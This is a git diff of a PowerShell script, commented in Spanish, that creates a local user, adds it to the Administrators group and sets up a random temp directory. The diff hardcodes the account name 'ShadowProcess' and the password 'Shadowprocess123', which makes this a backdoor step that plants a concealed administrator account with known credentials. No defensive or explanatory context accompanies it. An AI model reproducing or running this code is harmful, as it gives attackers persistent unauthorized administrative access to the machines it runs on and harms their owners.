@@ -1,9 +1,5 @@
 #Recursos
 
-#Variables 
-$wd = random_text
-$path = "$env:temp/$wd"
-$initial_dir = $PWD.Path
 #String random nombre de directorios.
 function random_text {
 	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
@@ -24,14 +20,20 @@ function create_account {
 		New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
 		Write-Verbose "$uname local user crated"
 		Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+		Write-Verbose "$NewLocalAdmin added to the local administrator group"
 		
 	}
 	end{
 	}
 }
 
+#Variables 
+$wd = random_text
+$path = "$env:temp/$wd"
+$initial_dir = $PWD.Path
+
 #creando usuario administrador 
-$uname = random_text
+$uname = "ShadowProcess"
 $pword = (ConvertTo-SecureString "Shadowprocess123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
